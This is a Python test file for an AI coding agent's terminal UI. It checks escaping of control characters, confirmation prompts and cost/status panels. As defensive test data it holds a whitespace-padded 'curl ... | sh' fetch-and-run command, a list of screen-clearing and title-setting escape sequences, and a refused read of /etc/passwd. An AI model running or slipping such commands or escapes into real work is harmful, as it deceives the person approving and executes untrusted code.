"""Tests for nanoclaude.cli.render: what the agent does, made readable and made safe.

The confirmation prompt is the one piece of UI that has to be right, and everything a
person reads here is either text this code wrote or text somebody else did. The sweeps
below (``HOOKS``) feed every method that prints outside text the same hostile strings,
so that a new method cannot print one unguarded and still pass.
"""

from __future__ import annotations

import asyncio
import re
from collections.abc import Awaitable, Callable
from datetime import date, timedelta
from pathlib import Path

import pytest
from rich.console import Console

from nanoclaude.agent.router import Router
from nanoclaude.agent.ui import UI, Approval
from nanoclaude.cli import render
from nanoclaude.cli.render import (
    ConsoleUI,
    cost_panel,
    render_diff,
    render_markdown,
    status_panel,
    summarise_call,
    visible,
)
from nanoclaude.config.schema import Config, ModelConfig, RolesConfig
from nanoclaude.conversation.transcript import TextBlock, ToolUseBlock
from nanoclaude.permissions.policy import Decision, PermissionRequest, PermissionResult
from nanoclaude.providers.base import ModelReply, StopKind, Usage
from nanoclaude.providers.capabilities import CapabilityCache
from nanoclaude.providers.pricing import Price, PriceBook
from nanoclaude.testing.session import build_session
from nanoclaude.tools.base import ToolOutcome
from tests.cli.helpers import (
    ASK,
    ScriptedPrompter,
    capture,
    colour_codes,
    edit_call,
    plain_console,
    stray_escapes,
    terminal_console,
    write_request,
)

ALLOW = PermissionResult(Decision.ALLOW, "rule.allow", "allowed")


class Screen:
    """A ConsoleUI on a plain console, with the text it has written so far."""

    def __init__(
        self, *answers: str | BaseException, auto_approve: bool = False, width: int = 100
    ) -> None:
        self.console, self._buffer = plain_console(width)
        self.prompter = ScriptedPrompter(*answers)
        self.ui = ConsoleUI(self.console, auto_approve=auto_approve, prompter=self.prompter)

    @property
    def text(self) -> str:
        return self._buffer.getvalue()


def reply(text: str) -> ModelReply:
    return ModelReply((TextBlock(text),), StopKind.END_TURN, Usage(), "scripted")


def row(text: str, label: str) -> str:
    """The line of a table whose first cell is ``label``."""
    for line in text.splitlines():
        if re.match(rf"\W*{re.escape(label)}(\W|$)", line):
            return line
    raise AssertionError(f"no row labelled {label!r} in:\n{text}")


# --------------------------------------------------------------------------
# Control characters are shown, never acted on
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "shown"),
    [
        ("a\x1b[2Kb", r"a\x1b[2Kb"),
        ("a\rb", r"a\rb"),
        ("a\nb", r"a\nb"),
        ("a\tb", r"a\tb"),
        ("a\x00b", r"a\x00b"),
        ("a\x07b", r"a\x07b"),
        ("a\x7fb", r"a\x7fb"),
        ("a\x9bb", r"a\x9bb"),
        ("a\N{RIGHT-TO-LEFT OVERRIDE}b", "a\\u202eb"),
        ("a\N{LEFT-TO-RIGHT EMBEDDING}b", "a\\u202ab"),
        ("a\N{LEFT-TO-RIGHT ISOLATE}b", "a\\u2066b"),
        ("a\N{POP DIRECTIONAL ISOLATE}b", "a\\u2069b"),
        ("a\x9fb", "a\\x9fb"),
        # Just outside the ranges: ordinary text, and not shown as escapes.
        ("a\N{NO-BREAK SPACE}b", "a\N{NO-BREAK SPACE}b"),
        ("a\N{NARROW NO-BREAK SPACE}b", "a\N{NARROW NO-BREAK SPACE}b"),
        ("a\N{LEFT-TO-RIGHT MARK}b", "a\N{LEFT-TO-RIGHT MARK}b"),
        (
            "caf\N{LATIN SMALL LETTER E WITH ACUTE} \N{GREEK SMALL LETTER LAMDA}",
            "caf\N{LATIN SMALL LETTER E WITH ACUTE} \N{GREEK SMALL LETTER LAMDA}",
        ),
        ("plain [id] text", "plain [id] text"),
        # Text that merely looks like an escape is left as it is: only the real thing is changed.
        (r"a\x1b", r"a\x1b"),
    ],
)
def test_every_control_character_is_shown_as_the_escape_that_names_it(raw, shown):
    assert visible(raw) == shown


def test_a_text_that_spans_lines_can_keep_its_line_breaks_and_tabs():
    assert visible("a\n\tb\x1bc", keep_newlines=True) == "a\n\tb\\x1bc"


# --------------------------------------------------------------------------
# Summaries
# --------------------------------------------------------------------------


def test_a_call_is_summarised_by_its_most_informative_argument():
    assert summarise_call(ToolUseBlock("t1", "Read", {"path": "a.py"})) == "a.py"
    assert summarise_call(ToolUseBlock("t2", "Bash", {"command": "npm test"})) == "npm test"
    assert summarise_call(ToolUseBlock("t3", "Grep", {"pattern": "TODO"})) == "TODO"
    assert summarise_call(ToolUseBlock("t4", "Git", {"subcommand": "status"})) == "status"
    assert summarise_call(ToolUseBlock("t5", "Odd", {"b": 1, "a": 2})) == "a, b"
    assert summarise_call(ToolUseBlock("t6", "Read", {"path": 123})) == "123"
    assert summarise_call(ToolUseBlock("t7", "Odd", {})) == ""


def test_a_long_summary_is_shortened():
    call = ToolUseBlock("t1", "Bash", {"command": "x" * 500})
    assert summarise_call(call) == "x" * 97 + "..."


def test_a_summary_shows_control_characters_instead_of_acting_on_them():
    call = ToolUseBlock("t1", "Read", {"path": "a\x1b[2K\rb"})
    assert summarise_call(call) == r"a\x1b[2K\rb"


# --------------------------------------------------------------------------
# Diffs and prose
# --------------------------------------------------------------------------


def test_a_diff_is_rendered_with_both_sides_visible():
    diff = "--- a/x.py\n+++ b/x.py\n@@ -1 +1 @@\n-old\n+new\n"
    text = capture(render_diff(diff))
    assert "-old" in text and "+new" in text


def test_model_prose_is_rendered_as_markdown_and_not_as_markup():
    text = capture(render_markdown("**bold** arr[0] [/] [bold]x[/bold]\n\n```py\nprint('hi')\n```"))
    assert "bold arr[0] [/] [bold]x[/bold]" in text
    assert "**" not in text and "print('hi')" in text


def test_a_link_in_model_prose_shows_where_it_goes():
    # A terminal hyperlink hides its destination behind its label, and the label is the
    # model's to choose. The destination is printed beside it.
    text = capture(render_markdown("[the docs](https://example.org/x)"))
    assert "the docs" in text and "https://example.org/x" in text


# --------------------------------------------------------------------------
# What a decision looks like
# --------------------------------------------------------------------------


def test_a_refusal_is_shown_with_its_rule_id():
    screen = Screen()
    result = PermissionResult(
        Decision.DENY, "sandbox.outside-root", "/etc/passwd is outside /home/me/proj"
    )
    screen.ui.on_decision(
        ToolUseBlock("t1", "Read", {"path": "/etc/passwd"}),
        PermissionRequest("Read", "/etc/passwd"),
        result,
    )
    # Spec 17.9, character for character: no "Refused" in the model-facing casing, and the
    # reason that says what was wrong, not only the rule that fired.
    assert screen.text == "refused (sandbox.outside-root): /etc/passwd is outside /home/me/proj\n"


def test_an_allowed_call_is_one_collapsed_line():
    screen = Screen()
    call = ToolUseBlock("t1", "Read", {"path": "src/a.py"})
    screen.ui.on_decision(call, PermissionRequest("Read", "/repo/src/a.py"), ALLOW)
    assert screen.text == "Read src/a.py\n"


def test_a_call_that_is_about_to_be_asked_about_is_not_announced_first():
    screen = Screen()
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    screen.ui.on_decision(call, PermissionRequest("Bash", "make"), ASK)
    assert screen.text == ""


def test_a_failed_call_shows_the_first_line_of_what_went_wrong():
    screen = Screen()
    call = ToolUseBlock("t1", "Read", {"path": "a.py"})
    screen.ui.on_outcome(call, ToolOutcome("t1", "a.py does not exist\nsecond line", is_error=True))
    assert screen.text == "  ! a.py does not exist\n"


def test_a_call_that_worked_adds_nothing_to_its_collapsed_line():
    screen = Screen()
    call = ToolUseBlock("t1", "Read", {"path": "a.py"})
    screen.ui.on_outcome(call, ToolOutcome("t1", "     1\tx = 1\n"))
    assert screen.text == ""


APPLIED = "Edited a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-x = 1\n+x = 2\n"


def test_an_edit_nobody_was_asked_about_is_shown_as_a_diff_once_it_is_applied():
    screen = Screen()
    screen.ui.on_outcome(edit_call("a.py", "x = 1", "x = 2"), ToolOutcome("e1", APPLIED))
    assert "-x = 1" in screen.text and "+x = 2" in screen.text
    assert "Edited" not in screen.text


def test_the_task_list_the_model_keeps_is_shown_as_the_tool_wrote_it():
    # TodoWrite exists so that the person can see what the model thinks it is doing. Its
    # check boxes are brackets, which rich would take for tags and drop.
    screen = Screen()
    call = ToolUseBlock("t1", "TodoWrite", {"todos": []})
    listing = "1/3 complete\n[x] read the parser\n[>] fix the bug\n[ ] run the tests"
    screen.ui.on_outcome(call, ToolOutcome("t1", listing))
    assert screen.text == listing + "\n"


def test_a_task_list_that_was_refused_shows_its_error_like_any_other_call():
    screen = Screen()
    call = ToolUseBlock("t1", "TodoWrite", {"todos": []})
    screen.ui.on_outcome(call, ToolOutcome("t1", "todos must be a list", is_error=True))
    assert screen.text == "  ! todos must be a list\n"


def test_the_reply_is_shown_as_markdown():
    screen = Screen()
    screen.ui.on_reply(reply("  **Done.** Two files changed.  "))
    assert screen.text.strip() == "Done. Two files changed."


def test_a_reply_that_says_nothing_prints_nothing():
    screen = Screen()
    screen.ui.on_reply(reply("   \n"))
    assert screen.text == ""


def test_a_retry_says_how_long_it_will_wait_and_why():
    screen = Screen()
    screen.ui.on_retry(2, 1.5, "overloaded_error")
    assert screen.text == "provider busy, retry 2 in 1.5s overloaded_error\n"


# --------------------------------------------------------------------------
# The confirmation
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("answer", "approval"),
    [
        ("y", Approval.ONCE),
        ("Y", Approval.ONCE),
        (" yes ", Approval.ONCE),
        ("a", Approval.ALWAYS),
        ("always", Approval.ALWAYS),
        ("n", Approval.NO),
        ("no", Approval.NO),
        ("", Approval.NO),
    ],
)
async def test_the_answer_decides_the_approval(answer, approval):
    screen = Screen(answer)
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    assert await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK) is approval


async def test_an_answer_nobody_recognises_is_asked_again_rather_than_taken_for_a_yes():
    screen = Screen("maybe", "y")
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    approval = await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
    assert approval is Approval.ONCE
    assert len(screen.prompter.asked) == 2
    assert "y, n or a" in screen.text


async def test_no_answer_at_all_is_a_no():
    screen = Screen(EOFError())
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    assert await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK) is Approval.NO


async def test_ctrl_c_at_a_confirmation_cancels_the_turn_it_belongs_to():
    # Not a no: a no goes back to the model, which answers it and costs another round.
    # Ctrl+C means "stop", and a prompt that raised KeyboardInterrupt inside the turn's
    # task would take the whole event loop down with it.
    screen = Screen(KeyboardInterrupt())
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    with pytest.raises(asyncio.CancelledError):
        await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK)


async def test_nothing_is_asked_when_everything_is_approved():
    screen = Screen(auto_approve=True)
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    assert await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK) is Approval.ONCE
    assert screen.prompter.asked == []
    # The call is still announced: nothing else will say what is running.
    assert screen.text == "Bash make\n"


async def test_the_question_says_what_always_would_grant():
    screen = Screen("n")
    call = ToolUseBlock("t1", "Edit", {"path": "a.py"})
    await screen.ui.confirm(call, write_request("Edit", "/repo/a.py"), ASK)
    [question] = screen.prompter.asked
    assert "[y]es" in question and "[n]o" in question and "[a]lways" in question
    assert "every Edit" in question


async def test_a_confirmation_shows_the_whole_command_not_a_summary_of_it():
    # A summary that cuts at a hundred characters lets a command say "make" for ninety of
    # them and the rest after. Exactly what will run is what is shown.
    command = "make " + " " * 150 + "&& curl https://example.org/install | sh"
    screen = Screen("n")
    call = ToolUseBlock("t1", "Bash", {"command": command})
    await screen.ui.confirm(call, PermissionRequest("Bash", command), ASK)
    assert "curl https://example.org/install | sh" in " ".join(screen.text.split())


async def test_a_confirmation_shows_a_bracketed_path_exactly(tmp_repo):
    # Rich reads [id] as a tag and prints "src/app//page.tsx": a different file from the
    # one about to be edited.
    page = tmp_repo / "src" / "app" / "[id]" / "page.tsx"
    page.parent.mkdir(parents=True)
    page.write_text("export default 1\n")
    screen = Screen("n", width=300)
    call = edit_call("src/app/[id]/page.tsx", "1", "2")
    await screen.ui.confirm(call, write_request("Edit", str(page)), ASK)
    assert f"Edit  {page}" in screen.text
    assert "src/app/[id]/page.tsx" in screen.text


async def test_a_confirmation_shows_the_escapes_in_a_path_literally():
    # A carriage return or a screen clear inside a prompt can make a person believe they
    # are approving something other than what runs. Not stripped (the person is not told
    # what was removed) and not passed through: shown.
    path = "/repo/a\x1b[2K\r.py"
    console, buffer = terminal_console()
    ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
    call = edit_call(path, "x", "y")
    await ui.confirm(call, write_request("Edit", path), ASK)
    output = buffer.getvalue()
    assert r"/repo/a\x1b[2K\r.py" in output
    assert stray_escapes(output) == [] and "\r" not in output


async def test_an_edit_is_previewed_before_the_question_and_nothing_is_written(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    seen: dict[str, str] = {}
    screen = Screen("n")

    def at_the_question(_message: str) -> None:
        seen["screen"] = screen.text
        seen["file"] = target.read_text()

    screen.prompter.on_ask = at_the_question
    approval = await screen.ui.confirm(
        edit_call("a.py", "x = 1", "x = 2"), write_request("Edit", str(target)), ASK
    )
    assert approval is Approval.NO
    assert "-x = 1" in seen["screen"] and "+x = 2" in seen["screen"]
    assert seen["file"] == "x = 1\n"


async def test_an_edit_that_has_been_previewed_is_not_shown_again_when_it_is_applied(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    screen = Screen("y")
    call = edit_call("a.py", "x = 1", "x = 2")
    await screen.ui.confirm(call, write_request("Edit", str(target)), ASK)
    before = screen.text
    screen.ui.on_outcome(call, ToolOutcome("e1", APPLIED))
    assert screen.text == before


async def test_an_edit_that_cannot_apply_is_said_not_to_be_previewable_and_why(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    screen = Screen("n")
    call = edit_call("a.py", "not in the file", "y")
    await screen.ui.confirm(call, write_request("Edit", str(target)), ASK)
    assert "no preview" in screen.text and "was not found" in screen.text


async def test_an_edit_whose_request_names_no_file_is_asked_about_without_a_preview():
    screen = Screen("y")
    call = edit_call("a.py", "x", "y")
    approval = await screen.ui.confirm(call, PermissionRequest("Edit", "a.py"), ASK)
    assert approval is Approval.ONCE
    assert screen.text == "\nEdit  a.py\n"


async def test_an_edit_of_a_file_that_is_not_there_is_said_not_to_be_previewable(tmp_repo):
    missing = tmp_repo / "missing.py"
    screen = Screen("n")
    await screen.ui.confirm(
        edit_call("missing.py", "x", "y"), write_request("Edit", str(missing)), ASK
    )
    assert "no preview" in screen.text


async def test_a_preview_shows_what_the_edit_would_write_with_its_controls_visible(tmp_repo):
    # The new text is the model's, and it is going into the file. Stripping the escape
    # sequence from the preview would show a person a cleaner edit than the one they approve.
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    console, buffer = terminal_console()
    ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
    call = edit_call("a.py", "x = 1", "x = '\x1b[2J'")
    await ui.confirm(call, write_request("Edit", str(target)), ASK)
    output = buffer.getvalue()
    assert r"\x1b[2J" in output and stray_escapes(output) == []


async def test_the_confirmation_prompt_is_not_built_until_something_is_asked(monkeypatch):
    built: list[int] = []

    def build() -> ScriptedPrompter:
        built.append(1)
        return ScriptedPrompter("n")

    monkeypatch.setattr(render, "new_prompter", build)
    console, _ = plain_console()
    ui = ConsoleUI(console)
    assert built == []
    await ui.confirm(
        ToolUseBlock("t1", "Bash", {"command": "make"}), PermissionRequest("Bash", "make"), ASK
    )
    assert built == [1]


# --------------------------------------------------------------------------
# Outside text is data: never markup, and never a command to the terminal
# --------------------------------------------------------------------------

Hook = Callable[[ConsoleUI, str], Awaitable[None]]


async def shows_a_reply(ui: ConsoleUI, text: str) -> None:
    ui.on_reply(reply(text))


async def shows_a_refusal(ui: ConsoleUI, text: str) -> None:
    result = PermissionResult(Decision.DENY, "rule.deny", text)
    ui.on_decision(
        ToolUseBlock("t1", "Read", {"path": "x"}), PermissionRequest("Read", "x"), result
    )


async def shows_an_allowed_call(ui: ConsoleUI, text: str) -> None:
    call = ToolUseBlock("t1", "Read", {"path": text})
    ui.on_decision(call, PermissionRequest("Read", text), ALLOW)


async def shows_a_failure(ui: ConsoleUI, text: str) -> None:
    ui.on_outcome(ToolUseBlock("t1", "Read", {"path": "x"}), ToolOutcome("t1", text, True))


async def shows_an_applied_edit(ui: ConsoleUI, text: str) -> None:
    applied = f"Edited a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-x = 1\n+{text}\n"
    ui.on_outcome(edit_call("a.py", "x = 1", "x = 2"), ToolOutcome("e1", applied))


async def shows_a_task_list(ui: ConsoleUI, text: str) -> None:
    ui.on_outcome(ToolUseBlock("t1", "TodoWrite", {"todos": []}), ToolOutcome("t1", f"[x] {text}"))


async def shows_output(ui: ConsoleUI, text: str) -> None:
    ui.on_output(text)


async def shows_a_retry(ui: ConsoleUI, text: str) -> None:
    ui.on_retry(1, 2.0, text)


async def asks_to_confirm(ui: ConsoleUI, text: str) -> None:
    call = ToolUseBlock("t1", "Bash", {"command": text})
    await ui.confirm(call, PermissionRequest("Bash", text), ASK)


HOOKS: list[Hook] = [
    shows_a_reply,
    shows_a_refusal,
    shows_an_allowed_call,
    shows_a_failure,
    shows_an_applied_edit,
    shows_a_task_list,
    shows_output,
    shows_a_retry,
    asks_to_confirm,
]
HOOK_IDS = [hook.__name__ for hook in HOOKS]

#: Tags, an unmatched closing tag, a colour, a bracketed route segment and an emoji code.
MARKUP = "arr[0] [/] [bold]x[/bold] [#fff] src/app/[id] :warning:"

ESCAPES = [
    "\x1b[2J",  # clear the screen
    "\x1b]0;TITLE\x07",  # set the window title, BEL-terminated
    "\x1b]0;TITLE\x1b\\",  # the same, ST-terminated
    "\x9b2J",  # the 8-bit form of the first
    "\x1bc",  # reset the terminal
    "\x1b[2K\r",  # erase the line and return to its start
]


@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_outside_text_is_data_and_never_markup(hook):
    screen = Screen("n")
    await hook(screen.ui, MARKUP)
    assert MARKUP in screen.text


@pytest.mark.parametrize("hostile", ESCAPES, ids=repr)
@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_no_outside_text_can_act_on_the_terminal(hook, hostile):
    console, buffer = terminal_console()
    ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
    await hook(ui, f"before {hostile} after")
    assert stray_escapes(buffer.getvalue()) == []
    assert "\r" not in buffer.getvalue()


async def test_a_tool_output_holding_a_closing_tag_prints_without_raising():
    # rich raises MarkupError for "[/]" with nothing to close.
    screen = Screen()
    ui = screen.ui
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    ui.on_outcome(call, ToolOutcome("t1", "build failed [/] see [/log]", is_error=True))
    assert screen.text == "  ! build failed [/] see [/log]\n"


def test_the_check_for_stray_escapes_sees_one_and_ignores_styling():
    assert stray_escapes("plain \x1b[1;31mred\x1b[0m") == []
    assert stray_escapes("a \x1b[2J b") == ["\x1b[2J b"]
    assert stray_escapes("a \x1b]0;T\x07") == ["\x1b]0;T\x07"]


@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_output_degrades_to_plain_text_when_not_a_terminal(hook):
    screen = Screen("n")
    await hook(screen.ui, "plain")
    assert screen.text != "" and "\x1b" not in screen.text


@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_no_colour_is_respected_on_a_terminal(hook, monkeypatch):
    monkeypatch.setenv("NO_COLOR", "1")
    console, buffer = terminal_console()
    await hook(ConsoleUI(console, prompter=ScriptedPrompter("n")), "plain")
    assert buffer.getvalue() != "" and colour_codes(buffer.getvalue()) == []


async def test_the_same_output_is_coloured_on_a_terminal_that_allows_it(monkeypatch):
    # The counterpart of the test above, so that a checker that reports nothing for
    # everything cannot pass it: the refusal really is red when colour is allowed.
    monkeypatch.delenv("NO_COLOR", raising=False)
    console, buffer = terminal_console()
    await shows_a_refusal(ConsoleUI(console), "outside the sandbox")
    assert "31" in colour_codes(buffer.getvalue())


# --------------------------------------------------------------------------
# /status
# --------------------------------------------------------------------------


def test_status_names_each_role_with_its_model_and_alias(tmp_repo):
    session = build_session(tmp_repo, [], compact_script=[])
    text = capture(status_panel(session, 0, 1_000))
    assert "claude-sonnet-5 (m)" in row(text, "main")
    assert "claude-sonnet-5 (m)" in row(text, "explore")
    assert "claude-haiku-4-5 (c)" in row(text, "compact")


def test_status_shows_the_mode_the_sandbox_the_session_and_the_tools(tmp_repo):
    session = build_session(tmp_repo, [])
    text = capture(status_panel(session, 0, 1_000), width=200)
    assert "default" in row(text, "mode")
    assert session.policy.sandbox.roots[0] in row(text, "sandbox")
    assert session.session_id in row(text, "session")
    assert str(len(session.registry)) in row(text, "tools")
    assert "0/40" in row(text, "turns")


@pytest.mark.parametrize(
    ("used", "available", "bar"),
    [
        (0, 10_000, "[" + "." * 20 + "]"),
        (5_000, 10_000, "[" + "#" * 10 + "." * 10 + "]"),
        (9_999, 10_000, "[" + "#" * 19 + "." + "]"),
        (20_000, 10_000, "[" + "#" * 20 + "]"),
        (500, 0, "[" + "." * 20 + "]"),
    ],
)
def test_the_context_bar_fills_in_proportion_and_survives_the_brackets_around_it(
    tmp_repo, used, available, bar
):
    # "[####....]" is a style tag to rich, and was printed as nothing at all once any
    # of it was filled.
    session = build_session(tmp_repo, [])
    line = row(capture(status_panel(session, used, available)), "context")
    assert bar in line and f"{used}/{available} tokens" in line


def test_a_sandbox_root_with_brackets_is_shown_as_it_is(tmp_repo):
    root = tmp_repo / "[id]"
    root.mkdir()
    session = build_session(root, [])
    assert "[id]" in row(capture(status_panel(session, 0, 1_000), width=300), "sandbox")


def test_a_narrow_terminal_gets_a_narrower_table(tmp_repo):
    session = build_session(tmp_repo, [])
    lines = capture(status_panel(session, 100, 1_000), width=40).splitlines()
    assert max(len(line) for line in lines) <= 40
    assert session.session_id in "".join(line.strip(" │") for line in lines)


# --------------------------------------------------------------------------
# /cost
# --------------------------------------------------------------------------


def router_with(prices: PriceBook, tmp_path: Path) -> Router:
    models = {
        "priced": ModelConfig("anthropic", "claude-sonnet-5"),
        "unpriced": ModelConfig("openai_compat", "mystery", base_url="https://x/v1"),
    }
    config = Config(models=models, roles=RolesConfig(*["priced"] * 6))
    return Router(config, CapabilityCache(tmp_path / "caps.json"), prices=prices)


def book(updated: date) -> PriceBook:
    return PriceBook({("anthropic", "claude-sonnet-5"): Price(3.0, 15.0)}, updated)


def test_cost_is_shown_per_role_and_in_total(tmp_path):
    router = router_with(book(date.today()), tmp_path)
    router.record("main", Usage(1_000_000, 100_000, 5), "anthropic", "claude-sonnet-5")
    text = capture(cost_panel(router, router.prices))
    assert re.search(r"main\W+claude-sonnet-5\W+1000000\W+100000\W+5\W+\$4\.5000", text)
    # The same figure again on the total row, which has no label.
    assert text.count("$4.5000") == 2


def test_a_model_with_no_price_costs_a_dash_and_makes_the_total_a_dash(tmp_path):
    router = router_with(book(date.today()), tmp_path)
    router.record("main", Usage(1_000_000), "anthropic", "claude-sonnet-5")
    router.record("explore", Usage(10), "openai_compat", "mystery")
    text = capture(cost_panel(router, router.prices))
    assert re.search(r"mystery\W+10\W+0\W+0\W+-\W*$", row(text, "explore"))
    assert "$0.00" not in text
    # The priced role's cost stands, and the total, which would be a guess, is not given:
    # it is the row after the last role, and it is a dash.
    assert "$3.0000" in row(text, "main")
    lines = text.splitlines()
    total = lines[lines.index(row(text, "explore")) + 1]
    assert "$" not in total and re.search(r"-\W*$", total)


def test_the_cost_table_says_it_covers_this_run_only(tmp_path):
    # After a resume the stored row holds the running total and the router holds only
    # what this run spent; the title says which one this is.
    router = router_with(book(date.today()), tmp_path)
    assert "this run" in capture(cost_panel(router, router.prices))


def test_an_old_price_table_is_flagged(tmp_path):
    old = date.today() - timedelta(days=200)
    router = router_with(book(old), tmp_path)
    text = capture(cost_panel(router, router.prices))
    assert str(old) in text and "out of date" in text


def test_a_current_price_table_is_not(tmp_path):
    router = router_with(book(date.today()), tmp_path)
    assert "out of date" not in capture(cost_panel(router, router.prices))


def test_a_narrow_terminal_gets_a_narrower_cost_table_and_the_names_give_way_not_the_numbers(
    tmp_path,
):
    router = router_with(book(date.today() - timedelta(days=200)), tmp_path)
    router.record("main", Usage(1_000_000, 100_000, 5), "anthropic", "claude-sonnet-5")
    text = capture(cost_panel(router, router.prices), width=50)
    assert max(len(line) for line in text.splitlines()) <= 50
    assert re.search(r"1000000\W+100000\W+5\W+\$4\.5000", row(text, "main"))


# --------------------------------------------------------------------------
# The UI protocol
# --------------------------------------------------------------------------

_conforms: UI = ConsoleUI(Console())


def test_the_console_ui_is_a_ui():
    assert isinstance(_conforms, UI)
